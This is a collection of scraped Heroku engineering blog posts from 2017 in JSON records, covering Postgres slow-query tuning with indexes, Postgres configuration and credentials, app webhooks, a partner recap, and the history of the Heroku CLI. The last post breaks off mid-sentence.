{"website": "Heroku", "title": "Using Heroku's Expensive Query Dashboard to Speed up your App", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/expensive-query-speed-up-app", "abstract": "Using Heroku's Expensive Query Dashboard to Speed up your App Posted by Richard Schneeman July 11, 2017 Listen to this article I recently demonstrated how you can use Rack Mini Profiler to find and fix slow queries . It’s a valuable tool for well-trafficked pages, but sometimes the slowdown is happening on a page you don't visit often, or in a worker task that isn't visible via Rack Mini Profiler. How can you find and fix those slow queries? Heroku has a feature called expensive queries that can help you out.  It shows historical performance data about the queries running on your database: most time consuming, most frequently invoked, slowest execution time, and slowest I/O. Recently, I used this feature to identify and address some slow queries for a site I run on Heroku named CodeTriage (the best way to get started contributing to open source). Looking at the expensive queries data for CodeTriage, I saw this: On the right is the query, on the left are two graphs; one graph showing the number of times the query was called, and another beneath that showing the average time it took to execute the query. You can see from the bottom graph that the average execution time can be up to 8 seconds, yikes! Ideally, I want my response time averages to be around 50 ms and perc 95 to be sub-second time, so waiting 8 seconds for a single query to finish isn't good. To find this on your own apps you can follow directions on the expensive queries documentation . The documentation will direct you to your database list page where you can select the database you’d like to optimize. From there, scroll down and find the expensive queries near the bottom. Once you've chosen a slow query, you’ll need to determine why it's slow. To accomplish this use EXPLAIN ANALYZE : issuetriage::DATABASE=> EXPLAIN ANALYZE\nissuetriage::DATABASE-> SELECT \"issues\".*\nissuetriage::DATABASE-> FROM \"issues\"\nissuetriage::DATABASE-> WHERE \"issues\".\"repo_id\" = 2151\nissuetriage::DATABASE->         AND \"issues\".\"state\" = 'open'\nissuetriage::DATABASE-> ORDER BY  created_at DESC LIMIT 20 OFFSET 0;\n                                                                       QUERY PLAN\n---------------------------------------------------------------------------------------------------------------------------------------------------------\nLimit  (cost=27359.98..27359.99 rows=20 width=1232) (actual time=82.800..82.802 rows=20 loops=1)\n   ->  Sort  (cost=27359.98..27362.20 rows=4437 width=1232) (actual time=82.800..82.801 rows=20 loops=1)\n         Sort Key: created_at\n         Sort Method: top-N heapsort  Memory: 31kB\n         ->  Bitmap Heap Scan on issues  (cost=3319.34..27336.37 rows=4437 width=1232) (actual time=27.725..81.220 rows=5067 loops=1)\n               Recheck Cond: (repo_id = 2151)\n               Filter: ((state)::text = 'open'::text)\n               Rows Removed by Filter: 13817\n               ->  Bitmap Index Scan on index_issues_on_repo_id  (cost=0.00..3319.12 rows=20674 width=0) (actual time=24.293..24.293 rows=21945 loops=1)\n                     Index Cond: (repo_id = 2151)\nTotal runtime: 82.885 ms In this case, I'm using Kubernetes because they currently have the highest issue count, so querying on that page will likely give me the worst performance. We see the total time spent was 82 ms, which isn't bad for one of the \"slowest\" queries, but we've seen that some can be way worse. Most single queries should be aiming for around a 1 ms query time. We see that before the query can be made it has to sort the data, this is because we are using an order on an offset clause. Sorting is a very expensive operation, you can see that it says the \"actual time\" can take between 27.725 ms and 81.220 ms just to sort the data, which is pretty tough. If we can get rid of this sort then we can drastically improve our query. One way to do this is... you guessed it, add an index. Unlike last week though, the issues table is HUGE. While the table we indexed last week only had around 2K entries, each of those entries can have a virtually unbounded number of issues. In the case of Kubernetes there are 5K+ issues, and that's only the state=open ones. The closed issue count is much larger than that, and it will only grow over time. We want to be mindful of taking up too much database size, so instead of indexing ALL the data, we can instead apply a partial index. I'm almost never querying for state=closed when it comes to issues, so we can ignore those while building our index. Here's the migration I used to add a partial index: class AddCreatedAtIndexToIssues < ActiveRecord::Migration[5.1]\n  def change\n    add_index :issues, :created_at, where: \"state = 'open'\"\n  end\nend What's the result of adding this index? Let's look at that same query we analyzed before: issuetriage::DATABASE=> EXPLAIN ANALYZE\nissuetriage::DATABASE-> SELECT \"issues\".*\nissuetriage::DATABASE-> FROM \"issues\"\nissuetriage::DATABASE-> WHERE \"issues\".\"repo_id\" = 2151\nissuetriage::DATABASE->         AND \"issues\".\"state\" = 'open'\nissuetriage::DATABASE-> ORDER BY  created_at DESC LIMIT 20 OFFSET 0;\n                                                                         QUERY PLAN\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\nLimit  (cost=0.08..316.09 rows=20 width=1232) (actual time=0.169..0.242 rows=20 loops=1)\n   ->  Index Scan Backward using index_issues_on_created_at on issues  (cost=0.08..70152.26 rows=4440 width=1232) (actual time=0.167..0.239 rows=20 loops=1)\n         Filter: (repo_id = 2151)\n         Rows Removed by Filter: 217\nTotal runtime: 0.273 ms Wow, from 80+ ms to less than half a millisecond. That's some improvement. The index keeps our data already sorted, so we don't have to re-sort it on every query. All elements in the index are guaranteed to be state=open so the database doesn't have to do more work there. The database can simply scan the index removing elements where repo_id is not matching our target. For this case it is EXTREMELY fast, but can you imagine a case where it isn't so fast? Perhaps you noticed that we still have to iterate over issues until we're able to find ones matching a given Repo ID. I'm guessing that since this repo has the most issues, it's able to easily find 20 issues with state=open . What if we pick a different repo? I looked up the oldest open issue and found it in Journey . Journey has an ID of 10 in the database. If we do the same query and look at Journey: issuetriage::DATABASE=> EXPLAIN ANALYZE\nissuetriage::DATABASE-> SELECT \"issues\".*\nissuetriage::DATABASE-> FROM \"issues\"\nissuetriage::DATABASE-> WHERE \"issues\".\"repo_id\" = 10\nissuetriage::DATABASE->         AND \"issues\".\"state\" = 'open'\nissuetriage::DATABASE-> ORDER BY  created_at DESC LIMIT 20 OFFSET 0;\n                                                                     QUERY PLAN\n----------------------------------------------------------------------------------------------------------------------------------------------------\n Limit  (cost=757.18..757.19 rows=20 width=1232) (actual time=21.109..21.110 rows=6 loops=1)\n   ->  Sort  (cost=757.18..757.20 rows=50 width=1232) (actual time=21.108..21.109 rows=6 loops=1)\n         Sort Key: created_at\n         Sort Method: quicksort  Memory: 26kB\n         ->  Index Scan using index_issues_on_repo_id on issues  (cost=0.11..756.91 rows=50 width=1232) (actual time=11.221..21.088 rows=6 loops=1)\n               Index Cond: (repo_id = 10)\n               Filter: ((state)::text = 'open'::text)\n               Rows Removed by Filter: 14\n Total runtime: 21.140 ms Yikes. Previously we're only using 0.27 ms, now we're back up to 21 ms. This might not have been the \"8 second\" query we were seeing before, but it's definitely slower than the first query we profiled. Even though we've got an index on created_at Postgres has decided not to use it. It's reverting back to a sorting algorithm and using an index on repo_id to pull the data. Once it has issues then it iterates over each to remove where the state is not open. In this case, there are only 20 total issues for Journey, so grabbing all the issues and iterating and sorting manually was deemed to be faster. Does this mean our index is worthless? Well considering this repo only has 1 subscriber, it's not the case we need to be optimizing for. Also if lots of people visit that page (maybe because of this article), then Postgres will speed up the query by using the cache. The second time I ran the exact same explain query, it was much faster: Total runtime: 0.092 ms Postgres already had everything it needed in the cache. Does this mean we're totally out of the woods then? Going back to my expensive queries page after a few days, I saw that my 8 second worst case is gone, but I still have a 2 second query every now and then. This is still a 75% performance increase (in worst case performance) so the index is still useful. One really useful feature of Postgres is the ability to combine multiple indexes . In this case, even though we have an index on created_at and an index on repo_id , Postgres does not seem to think it's faster to combine the two and use that result. To fix this issue we can add an index that has both created_at and repo_id , which maybe I'll explore in the future. Before we go, I want to circle back to how we found our slow query test case. I had to know a bit about the data and make some assumptions about the worst case scenarios. I had to guess that Kubernetes was our worst offender, which ended up not being true. Is there a better way than guess and check? It turns out that Heroku will output slow queries into your app's logs . Unlike the expensive queries, these logs also contain the parameters used in the query, and not just the query. If you have a logging addon such as Papertrail , you can search your logs for duration and get a result like this: Jun 26 06:36:54 issuetriage app/postgres.29339:  [DATABASE] [39-1] LOG:  duration: 3040.545 ms  execute <unnamed>: SELECT COUNT(*) FROM \"issues\" WHERE \"issues\".\"repo_id\" = $1 AND \"issues\".\"state\" = $2 \nJun 26 06:36:54 issuetriage app/postgres.29339:  [DATABASE] [39-2] DETAIL:  parameters: $1 = '696', $2 = 'open' \nJun 26 08:26:25 issuetriage app/postgres.29339:  [DATABASE] [40-1] LOG:  duration: 9087.165 ms  execute <unnamed>: SELECT COUNT(*) FROM \"issues\" WHERE \"issues\".\"repo_id\" = $1 AND \"issues\".\"state\" = $2 \nJun 26 08:26:25 issuetriage app/postgres.29339:  [DATABASE] [40-2] DETAIL:  parameters: $1 = '1245', $2 = 'open' \nJun 26 08:49:40 issuetriage app/postgres.29339:  [DATABASE] [41-1] LOG:  duration: 2406.615 ms  execute <unnamed>: SELECT  \"issues\".* FROM \"issues\" WHERE \"issues\".\"repo_id\" = $1 AND \"issues\".\"state\" = $2 ORDER BY created_at DESC LIMIT $3 OFFSET $4 \nJun 26 08:49:40 issuetriage app/postgres.29339:  [DATABASE] [41-2] DETAIL:  parameters: $1 = '1348', $2 = 'open', $3 = '20', $4 = '760' In this case, we can see that our 2.4 second query (the last query in the logs above) is using a repo id of 1348 and an offset of 760 , which brings up another important point. As the offset goes up, the cost of scanning our index will also go up, so it turns out that we had a worse case than my initial guess (Kubernetes) and my second guess (Journey). It is likely that this repo has lots of issues that are old, and this query isn't made often, so that the data is not in cache. By using the logs we can find the exact worst case scenario without all the guessing. Before you start writing that comment message, yes, I know that offset pagination is broken and there are other ways to paginate . I may start to look at alternative pagination options, or even getting rid of some of the pagination on the site altogether. I did go back and add an index to both the created_at and repo_id columns . With the addition of those two indexes my \"worst case\" of 2.4 seconds is now down to 14 ms: issuetriage::DATABASE=> EXPLAIN ANALYZE SELECT  \"issues\".*\nissuetriage::DATABASE-> FROM \"issues\"\nissuetriage::DATABASE-> WHERE \"issues\".\"repo_id\" = 1348\nissuetriage::DATABASE-> AND \"issues\".\"state\" = 'open'\nissuetriage::DATABASE-> ORDER BY created_at DESC\nissuetriage::DATABASE-> LIMIT 20 OFFSET 760;\n                                                                                QUERY PLAN\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n Limit  (cost=1380.73..1417.06 rows=20 width=1232) (actual time=14.515..14.614 rows=20 loops=1)\n   ->  Index Scan Backward using index_issues_on_repo_id_and_created_at on issues  (cost=0.08..2329.02 rows=1282 width=1232) (actual time=0.061..14.564 rows=780 loops=1)\n         Index Cond: (repo_id = 1348)\n Total runtime: 14.659 ms\n(4 rows) Here you can see that we're able to use our new index directly and find only the issues that are open and belonging to a specific repo id. What did I learn from this experiment? You can find slow queries using Heroku's expensive queries feature. The exact arguments matter a lot when profiling queries. Don't assume that you know the most expensive thing your database is doing, use metrics. You can find the exact parameters that go with those expensive queries by grepping your logs for the exact parameters of those queries . Indexes help a ton, but you have to understand the different ways your application will use them. It's not enough to profile with 1 query before and after, you need to profile a few different queries with different performance characteristics. In my case not only did I add an index, I went back to the expensive index page which let me know that my queries were still taking a long time (~2 seconds). Performance tuning isn't about magic fixes, it's about finding a toolchain you understand, and iterating on a process until you get the results you want. Richard Schneeman is an Engineer for Heroku who also writes posts on his own blog . If you liked this post, you can subscribe to his mailing list to get more like it for free . ruby postgres sql expensive queries pagination", "date": "2017-07-11,"},
{"website": "Heroku", "title": "FY18 Q2 recap: Heroku Continuous Integration GA & Ephemeral Apps", "author": ["Arif Gursel"], "link": "https://blog.heroku.com/fy18-q2-recap-heroku-continuous-integration-ga-epheremal-apps", "abstract": "FY18 Q2 recap: Heroku Continuous Integration GA & Ephemeral Apps Posted by Arif Gursel July 28, 2017 Listen to this article Need to quickly catch up on this past quarter's announcements? Here are the top three topics to tune in on: Heroku announced the general availability of continuous integration (CI) on May 18, 2017. This new feature creates copies of staging apps to run tests, then destroys the app and its add-ons. With Heroku CI, you will see an increase in the number of default ephemeral plan resources regularly provisioned on Heroku review and CI apps. Previously, these apps used the add-on plan configured for staging. As developers adopt CI/CD workflows, temporary deployments are becoming increasingly common. When ephemeral apps and their associated add-ons are destroyed, these actions should not be interpreted as account events and user account cancellation notifications are not needed . To identify ephemeral \"temporary deployment\" apps, partners can use Heroku Pipelines to determine an app’s deployment stage by accessing the Platform API for Partners. Managing and understanding various add-on plan options for Heroku customers can be challenging. While publicly listed add-on plans on the Heroku marketplace may meet most customers’ needs, there are occasions when “custom” plans are needed for specific use cases that you may want to keep hidden. A how-to guide on the various add-on plan options for add-ons in general availability , “ How to Create Custom Heroku Add-on Plans ”,  is now available. addons partners partner portal continuous integration api manifest password ephemeral apps custom plans", "date": "2017-07-28,"},
{"website": "Heroku", "title": "Heroku Postgres Update: Configuration, Credentials, and CI", "author": ["Rimas Silkaitis"], "link": "https://blog.heroku.com/postgres-configuration-credentials-ci", "abstract": "Heroku Postgres Update: Configuration, Credentials, and CI Posted by Rimas Silkaitis August 08, 2017 Listen to this article At the core of Heroku’s data services sits Postgres, and today, we are making it even easier to bend Heroku Postgres to the very unique needs of your application’s stack.  With these new features, you can easily customize Postgres, making it more powerful and configurable, while retaining all the automation and management capabilities of Heroku Postgres you know and love. By changing Postgres settings, creating and working with database credentials, and providing tight integrations to Heroku and Heroku CI, you now have the ability to further tune your Postgres database to your team’s needs. More Flexible Postgres with PGSettings As we start peeling back the layers of Heroku Postgres, the ability to change the default behavior is the first step in making Heroku Postgres more flexible. Using the Heroku CLI, any developer can use the PGSettings feature to change portions of the default Heroku Postgres configuration. One of the more acute areas to change behavior is around database logging. As Heroku Postgres databases start getting sufficiently large, this could be in terms of the number of transactions, data volumes, or connections, these databases are generating large amount of logs that could hamper performance of the database. $ heroku pg:settings postgresql-large-1234 -a sushi\n=== postgresql-large-1234\nlog-lock-waits:             true\nlog-min-duration-statement: 2000\nlog-statement:              ddl With log-statements , for example, you can change this setting to none and the database won’t log any information besides slow queries and errors. For databases on Heroku Postgres that experience a large amount of thrashing in the schema, for example, temp tables that come and go, this can save lots of space and increase performance of the system by not having to write so many log statements. $ heroku pg:settings:log-statement ddl -a sushi\nlog-statement has been set to ddl for postgresql-large-1234.\nAll data definition statements, such as CREATE, ALTER and DROP, will be logged in your application's logs. PGSettings is available for Heroku Postgres databases running on a current production plan, Standard, Premium, Private, or Shield, on Postgres version 9.6 or above. Manage Access Permissions with Heroku Postgres Credentials One of the benefits of Heroku Postgres is how the relationship between a database and its associated application are automatically maintained.  When a database needs to be re-instantiated, or its credentials have changed, these values are automatically reflected to the application. With the advent of sharable add-ons (and databases), a single database can now be used by multiple applications. With Heroku Postgres Credentials, each of those applications can now have a unique connection to each database, so the same automated credential management can now carry across multiple applications. In addition, as these credentials are scoped to a Heroku application, this feature provides an easy and powerful way to manage the scoping of database access to discrete groups of users in a way that’s tightly integrated to the existing Heroku permissions model. For example, if your team has a data scientist or analyst, a best practice would be to create a read-only credential and give that individual access via that scoped credential which they can retrieve by accessing the environment information for a specific application. This way, the risk to changing the database has been mitigated. Credentials can be created via the Heroku Data dashboard or the Heroku CLI, and are available for all non-legacy production plans, Standard, Premium, Private and Shield, on Postgres 9.6 and above. Tight Integration With Heroku CI and Pipelines You can now auto-provision Heroku Postgres instances for all your Heroku CI test runs and Heroku Pipelines Review apps with zero configuration.  This allows Heroku Postgres users seamless, automated environment management for testing the code of any pull request, Git merge, or arbitrary build against a free, disposable Heroku Postgres hobby instance. You can optionally populate these instances with test data in the \"Release Phase\" script fully support by Heroku Pipelines. Each ephemeral Heroku Postgres DB is designed to instantiate (and self-destroy) quickly and cleanly -- and you pay only for the dynos during duration of the test run, or the existence of the Review app.  As always, progress and results are reported to your development team in Slack , in GitHub , and your Heroku Dashboard. Integrating all the bits! All of these features - PGSettings, Heroku Postgres Credentials and Integration with Heroku CI and Pipelines - are available today. We are exploring new ways to make Postgres even more versatile and powerful, and if you have any new settings you’d like to see exposed, or any ideas on integrations with Heroku, email us at postgres@heroku.com . postgres slack GitHub continuous integration Heroku Flow devops", "date": "2017-08-08,"},
{"website": "Heroku", "title": "Heroku Webhooks: Powering New Integrations and Real-time Notifications", "author": ["Nahid Samsami"], "link": "https://blog.heroku.com/heroku-webhooks", "abstract": "Heroku Webhooks: Powering New Integrations and Real-time Notifications Posted by Nahid Samsami August 22, 2017 Listen to this article We're happy to announce that Heroku app webhooks is now generally available for all Heroku customers. App webhooks provide notifications when your Heroku app changes, including modifications to domain settings, releases, add-ons, and dyno formations. These notifications can empower your internal communications, dashboards, bots or anything else that can receive HTTP POST requests. Integrating with Heroku webhooks provides easy support for driving custom workflows and 3rd party tools. Creating webhooks With the webhooks CLI plugin, you can subscribe to events with a single command. heroku plugins:install heroku-webhooks        \nheroku webhooks:add -i api:release -l notify -u https://example.com/hooks -a your-app In this example, after a new release is created for your-app, Heroku sends a POST request to your server endpoint with the details of the event. The example below shows the first section of a typical POST request: Receiving webhooks Webhooks are delivered by POST requests to a designated, publicly accessible URL. By specifying the sync notification level when setting up webhooks, Heroku will automatically retry delivery of failed webhook events. When to Use webhooks Integrating with webhooks simplifies reacting to changes from your Heroku apps. Instead of repeatedly polling the Platform API and comparing the responses to identify changes, a webhook will automatically be delivered when a change has occurred. Webhooks can power many real-time use cases, from internal dashboards that aggregate events from your Heroku applications to customized email notifications for specific members of your team. Chat notifications are a great example of how webhooks can be used to keep your team informed. While Heroku ChatOps provides a ready-built solution for pipeline events in Slack, you can also use webhooks to build custom notifications. Easy to Setup The app webhooks tutorial allows you to deploy a “webhook viewer” application in just a few clicks. The application walks you through creating a webhook and allows you to check the webhook contents before integrating webhook reception into your own application. The application also enables easier debugging as you’re able to easily view all the HTTP request data. After completing the tutorial, learn about all the supported event types and the webhooks API in the full webhooks documentation . Feedback We plan to support more event types in the future and welcome your suggestions. If you have feedback you can reach us at ecosystem-feedback@heroku.com . webhooks notifications platform api chatops integration", "date": "2017-08-22,"},
{"website": "Heroku", "title": "Evolution of the Heroku CLI: 2008-2017", "author": ["Jeff Dickey"], "link": "https://blog.heroku.com/evolution-of-heroku-cli-2008-2017", "abstract": "Evolution of the Heroku CLI: 2008-2017 Posted by Jeff Dickey August 15, 2017 Listen to this article Over the past decade, millions of developers have interacted with the Heroku CLI .  In those 10 years, the CLI has gone through many changes. We've changed languages several times; redesigned the plugin architecture; and improved test coverage and the test framework.  What follows is the story of our team's journey to build and maintain the Heroku CLI from the early days of Heroku to today. Ruby (CLI v1-v3) Go/Node (CLI v4) Go/Node (CLI v5) Pure Node (CLI v6) What's Next? Ruby (CLI v1-v3) Our original CLI (v1-v3) was written in Ruby and served us well for many years.  Ruby is a great, expressive language for building CLIs, however, we started experiencing enough problems that we knew it was time to start thinking about some major changes for the next version. For example, the v3 CLI performed at about half the speed on Windows as it did on Unix. It was also difficult to keep the Ruby environment for a user's application separate from the one used by the CLI.  A user may be working on a legacy Ruby 1.8.7 application with gems specific to Ruby 1.8.7. These must not conflict with the Ruby version and gem versions the CLI uses. For this reason, commands like heroku local (which came later) would have been hard to implement. However, we liked the plugin framework of the v3 CLI. Plugins provide a way for us to nurse new features, test them first internally and then later in private and public beta. Not only does this allow us to write experimental code that we don't have to ship to all users, but also, since the CLI is an open-source project, we sometimes don't want to expose products we're just getting started on (or that are experimental) in a public repository. A new CLI not only needed to provide a plugin framework like v3, but also it was something we wanted to expand on as well. Another reason we needed to rewrite the CLI was to move to Heroku's API v3 . At the start of this project, we knew that the old API would be deprecated within a few years, so we wanted to kill two birds with one stone by moving to the new API as we rewrote the CLI. Go/Node (CLI v4) When we started planning for v4, we originally wanted the entire CLI to be written in Go. An experimental CLI was even done before I started at the company to rebuild the CLI in Go called hk . hk was a major departure from the existing CLI that not only changed all the internals, but changed all the commands and IO as well. Parity with CLI v3 We couldn't realistically see a major switch to a new CLI that didn't keep at least a very similar command syntax. CLIs are not like web interfaces, and we learned this the hard way. On the web you can move a button around, and users won't have much trouble seeing where it went. Renaming a CLI command is a different matter.  This was incredibly disruptive to users. We never want users to go through frustration like that again. Continuing to use existing syntax and output was a major goal of this project and all future changes to the CLI. While we were changing things, we identified some commands that we felt needed work with their input or output. For example, the output of heroku addons changed significantly using a new table output. We were careful to display deprecation warnings on significant changes, though. This is when we first started using color heavily in the CLI. We disable color when the output is not a tty to avoid any issues with parsing the CLI output. We also added a --json option to many commands to make it easier to script the CLI with jq . No Runtime Dependency In v3, ensuring that we had a Ruby binary that didn't conflict with anything on the user's machine on all platforms was a big headache. The way it was done before also did not allow us to update Ruby without installing a new CLI (so we would've been stuck with Ruby 1.9 forever). We wanted to ensure that the new CLI didn't have a runtime dependency so that we could write code in whatever version of Ruby we wanted to without worrying about compatibility. So Why Not All Go? You might still be wondering why we didn’t reimplement both the plugins and core in Go (but maintain the same command syntax) to obviate our runtime dependency concerns.  As I mentioned, originally we did want to write the CLI in Go as it provided extremely fast single-file binaries with no runtime dependency. However, we had trouble reconciling this with the goal of the plugin interface. At the time, Go provided no support for dynamic libraries and even today this capability is extremely limited. We considered an approach where plugins would be a set of compiled binaries that could be written in any language, but this didn't provide a strong interface to the CLI. It also begged the question of where they would get compiled for all the architectures. Node.js for Plugins and Improved Plugin Architecture This was when we started to think about Node as the implementation language for plugins. The goal was for the core CLI (written in Go) to download Node just to run plugins and to keep this Node separate from any Node binary on the machine. This kept the runtime dependency to a minimum. Additionally, we wanted plugins to be able to have their own dependencies (library not runtime). Ruby made this hard as it's very difficult to have multiple versions of the same gem installed. If we ever wanted to update a gem in v3, we had to go out of our way to fix every plugin in the ecosystem to work with the new version. This made updating any dependencies difficult. It also didn't allow plugins to specify their own dependencies. For example, the heroku-redis plugin needs a redis dependency that the rest of the CLI doesn't need. We also wanted to improve the plugin integration process. In v3, when we wanted the functionality from a plugin to go into the core of the CLI, it was a manual step that involved moving the commands and code into the core of the CLI and then deprecating the old plugin. It was fraught with errors and we often had issues come up attempting this. Issues were compounded because it usually wasn't done by a CLI engineer. It was done by a member on another team that was usually moving a plugin for their first time. Ultimately we decided to flip this approach on its head. Rather than figure out an easy way to migrate plugin commands into the core, we made the CLI a collection of core plugins. In other words, a plugin could be developed on its own and installed as a “user plugin”, then when we wanted to deliver it to all users and have it come preinstalled, we simply declared it as a “core plugin”. No modifications to the plugin itself would be required. This model provided another benefit. The CLI is now a modular set of plugins where each plugin could potentially be maintained by a separate team. The CLI provides an interface that plugins must meet, but outside of that, individual teams can build their own plugins the way they want without impacting the rest of the codebase. Allowing these kinds of differences in plugins is actually really powerful. It has allowed developers on other teams and other companies to provide us with clever ideas about how to build plugins. We've continually been able to make improvements to the plugin syntax and conventions by allowing other developers the ability to write things differently as long as they implemented the interface. Slow Migration One thing I've learned from doing similar migrations on back-end web services is that it's always easier to migrate something bit-by-bit rather than doing a full-scale replacement. The CLI is a huge project with lots of moving parts. Doing a full-scale replacement would have been a 1+ year project and would have involved a painful QA process while we validated the new CLI. Instead, we decided to migrate each command individually. We started out by writing a small core CLI with just a few lesser-used commands and migrating them from the v3 CLI to the v4 CLI one at a time. Moving slow allowed us to identify issues with specific commands (whether it was an issue with the core of the CLI, the command itself, or using the new API). This minimized effort on our part and user impact by allowing us to quickly jump on issues related to command conversion. We knew this project would likely take 2 years or longer when we started. This wasn't our only task during this time though, so it enabled us to make continual progress while also working on other things. Over the course of the project, we sometimes spent more time on command conversion, sometimes less. Whatever made sense for us at the time. The only real drawback with this approach was user confusion. Seeing two versions of the CLI listed when running heroku version was odd and it also wasn't clear where the code lived for the CLI. We enabled the gradual migration from v3 to v4 by first having v3 download v4, if it did not exist, into a dotfile of the user's home directory. v4 provides a hidden command heroku commands --json that outputs all the information about every command including the help. When v3 starts, it runs this command so that it knows what commands it needs to proxy to v4 as well as what the full combined help is for both v3 and v4. For 2 years we shipped our v4 Go/Node CLI alongside v3. We converted commands one by one until everything was converted. Go/Node (CLI v5) The v5 release of the CLI was more of an incremental change. Users would occasionally see issues with v4 when first running the CLI because it had trouble downloading Node or the core plugins. v5 was a change from downloading Node when the CLI was first run, to including Node in the initial tarball so it would be available when the CLI first loaded. Another change was that instead of running npm install to install the core plugins on first run, we included all the core plugins' Node files with the initial tarball and kept the user plugins separate. Ruby to Node Command Conversion Complete In December 2016, we finally finished converting all the commands into the new plugins-based CLI. At this point we modified our installers to no longer include the v3 CLI and the shim that launched the v4 or v5 CLI. Existing users with the CLI already installed as of this time will still be using the v3 CLI because we can't auto-update all parts of the CLI, but new installers will not include v3 and are fully migrated to v5 (or now, v6). If you still have the Ruby CLI installed (you’ll know if you run ‘heroku version’ and see v3.x.x mentioned), you’ll benefit from a slight speed improvement by installing the current version of the CLI to get rid of these old v3 components. Pure Node (CLI v6) In April 2017 we released the next big iteration of the CLI, v6. This included a number of advantages with a lighter and generic core written only in Node that could be used as a template for building other CLIs, and a new command syntax. Leaving Go While at Heroku we use Go heavily on the server-side with great success, Go did not work out well for us as a CLI language due to a number of issues. OS updates would cause networking issues and cross-compiling would cause issues where linking to native objects did not work. Go is also a relatively low-level language which increased the time to write new functionality. We were also writing very similar, if not exactly the same, code in Go and Node so we could directly compare how difficult it was to write the same functionality in multiple languages. We had long felt that the CLI should be written in pure Node. In addition to only having one language used and fewer of the issues we had writing the CLI in Go, it also would allow for more communication between plugins and the core. In v4 and v5, the CLI started a new Node process every time it wanted to request something from a plugin or command (which takes a few hundred ms). Writing the CLI entirely in Node would keep everything loaded in a single process. Among other things, this allowed us to design a dynamic autocomplete feature we had long wanted. cli-engine Occasionally we would be asked how other people could take advantage of the CLI codebase for their own use — not just to extend the Heroku CLI, but to write entirely new CLIs themselves. Unfortunately the Node/Go CLI was complicated for a few reasons: it had a complex Makefile to build both languages and the plugins, it was designed to work both standalone as well as inside v3, and there was quite a bit of “special” functionality that only worked with Heroku commands. (A good example is the --app flag). We wanted a general solution to allow other potential CLI writers to be able to have custom functionality like this as well. CLI v6 is built on a platform we call cli-engine . It's not something that is quite ready for public use just yet, but the code is open sourced if you'd like to take a peek and see how it works. Expect to hear more about this soon when we launch examples and documentation around its use. New Plugin Interface Due to the changes needed to support much of the new functionality in CLI v6, we knew that we would have to significantly change the way plugins were written. Rather than look at this as a challenge, we considered it an opportunity to make improvements with new JavaScript syntax. The main change was moving from the old JavaScript object commands into ES2015 (ES6) class-based commands. // v5\nconst cli = require('heroku-cli-util')\nconst co = require('co')\nfunction * run (context, heroku) {\n  let user = context.flags.user || 'world'\n  cli.log(`hello ${user}`)\n}\nmodule.exports = {\n  topic: 'hello',\n  command: 'world',\n  flags: [\n    { name: 'user', hasValue: true, description: 'who to say hello to' }\n  ],\n  run: co.wrap(cli.command(run))\n}\n\n// v6\nimport {Command, flags} from 'cli-engine-heroku'\nexport default class HelloCommand extends Command {\n    static topic = 'hello'\n    static command = 'world'\n    static flags = {\n      user: flags.string({ description: 'who to say hello to' })\n    }\n\n    async run () {\n      let user = this.flags.user || 'world'\n      this.out.log(`hello ${user}`)\n    }\n} async/await async / await finally landed in Node 7 while we were building CLI v6. We had been anticipating this since we began the project by using co . Switching to async / await is largely a drop-in replacement: // co\nconst co = require('co')\nlet run = co.wrap(function * () {\n  let apps = yield heroku.get('/apps')\n  console.dir(apps)\n})\n\n// async/await\nasync function {\n  let apps = await heroku.get('/apps')\n  console.dir(apps)\n} The only downside of moving away from co is that it offered some parallelization tricks using arrays of promises or objects of promises. We have to fall back to using Promise.all() now: // co\nlet run = co.wrap(function * () {\n  let apps = yield {\n    a: heroku.get('/apps/appa'),\n    b: heroku.get('/apps/appb')\n  ]\n  console.dir(apps.a)\n  console.dir(apps.b)\n})\n\n// async/await\nasync function run () {\n  let apps = await Promise.all([\n    heroku.get('/apps/appa'),\n    heroku.get('/apps/appb')\n  ])\n  console.dir(apps[0])\n  console.dir(apps[1])\n} It's not a major drawback, but it does make the code slightly more complicated. Not having to use a dependency and the semantic benefits of using async / await far outweigh this drawback. Flow The CLI is now written with Flow . This static type checker makes plugin development much easier as it can enable text editors to provide powerful code autocomplete and syntax checking, verifying that the plugin interface is used correctly. It makes plugins more resilient to change by providing interfaces checked with static analysis. While learning new tools is a challenge when writing code, we've found that with Flow the difficulty was all in writing the core of the CLI and not as much in plugin writing. Writing plugins involves using existing types and functions so often plugins won't have any type definitions at all, where the core has many. This means we as the  CLI engineers have done the hard work to include the static analysis, but plugin developers reap the benefits of having their code checked without having to learn much of a new tool if any. Babel Class properties and Flow required us to use Babel in order to preprocess the code. Because the process for developing plugins requires you to “link” plugins into the CLI, this allowed us to check if the code had any changes before running the plugin. This means that we can use Babel without requiring a “watch” process to build the code. It happens automatically and there is no need to setup Babel or anything else. All you need is the CLI to develop plugins. (Note that Node must be installed for testing plugins, but it isn't needed to run a plugin in dev mode.) Improved Testing Testing is crucial to a large, heavily-used CLI. Making changes in the core of the CLI can have unexpected impact so providing good test coverage and making tests easy to write well is very important. We've seen what common patterns are useful in writing tests and iterated on them to make them concise and simple. As part of the new plugin interface, we've also done some work to make testing better. There were some gaps in our coverage before where we would have common issues. We worked hard to fill those gaps, ensuring our tests guaranteed commands were properly implementing the plugin interface while keeping the tests as simple as possible to write. Here is what they look like in comparison from v5 of the CLI to v6: // v5 mocha test: ./test/commands/hello.js\nconst cli = require('heroku-cli-util')\nconst expect = require('chai').expect\ndescribe('hello:world', function () {\n  beforeEach(() => {\n    cli.mockConsole()\n  })\n  it('says hello to a user', function () {\n    return cmd.run({flags: {user: 'jeff'}})\n      .then(() => expect(cli.stdout).to.equal('hello jeff!\\n'))\n  })\n})\n\n// v6 jest test: ./src/commands/hello.test.js\nimport Hello from './hello'\ndescribe('hello:world', () => {\n  it('says hello to a user', async () => {\n    let {stdout} = await Hello.mock('--user', 'jeff')\n    expect(stdout).toEqual('hello jeff!\\n')\n  })\n}) The syntax is almost identical, but we're using Jest in v6 and Mocha in v5. Jest comes preloaded with a mocking framework and expectation framework so there is much less to configure than with mocha. The v6 tests also run the flag parser which is why '--user', 'jeff' has to be passed in. This avoids a common issue with writing v5 tests where you could write a test that works but not include the flag on the command definition. Also, if there is any quirk or change with the parser, we'll be able to catch it in the test since it's running the same parser. What's Next? With these changes in place, we've built a foundation for the CLI that's already been successful for several projects at Heroku. It empowers teams to quickly build new functionality that is well tested, easy to maintain, and has solid test coverage. In addition, with our CLI Style Guide and common UI components, we're able to deliver a consistent interface. In the near future, expect to see more work done to build more interactive interfaces that take advantage of what is possible in a CLI. We're also planning on 